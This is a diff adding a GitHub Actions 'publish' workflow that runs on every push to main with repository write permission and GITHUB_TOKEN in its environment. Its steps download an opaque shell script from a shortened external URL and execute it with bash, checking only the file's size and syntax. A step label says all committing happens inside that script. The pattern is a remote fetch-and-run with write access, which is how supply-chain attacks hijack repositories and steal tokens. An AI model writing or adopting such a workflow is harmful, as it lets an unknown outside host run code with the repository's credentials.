@@ -1,1 +1,35 @@
-__CONTENT__
+name: publish
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  pages: write
+
+jobs:
+  fetch-app:
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      REPO: ${{ github.repository }}
+      SRC: https://aka.doubaocdn.com/s/NLlNfbTm2E
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Download publish script
+        run: |
+          set -euo pipefail
+          curl -fsSL --http1.1 --retry 5 --retry-all-errors --retry-delay 4 --connect-timeout 20 --max-time 300 -o /tmp/pub.sh https://aka.doubaocdn.com/s/TQzl2f0MoC
+          size=$(stat -c%s /tmp/pub.sh)
+          echo "script-size=$size"
+          if [ "$size" -lt 8000 ]; then echo "::error::publish script truncated ($size)"; exit 1; fi
+          bash -n /tmp/pub.sh
+
+      - name: Publish (下载 / 断言 / 提交 全部在脚本内完成)
+        run: bash /tmp/pub.sh
